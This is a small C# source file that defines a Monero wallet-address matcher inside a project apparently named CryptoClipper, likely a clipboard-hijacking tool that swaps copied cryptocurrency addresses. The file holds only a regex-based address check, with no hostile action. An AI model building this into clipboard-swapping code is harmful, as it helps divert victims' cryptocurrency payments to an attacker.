using CryptoClipper.Models;
using CryptoClipper.Utils;

namespace CryptoClipper.Wallets;

public sealed class MoneroMatcher : IWalletPattern
{
    public CoinType CoinType => CoinType.Monero;

    public bool IsMatch(string address) =>
        RegexPatterns.Monero().IsMatch(address);
}
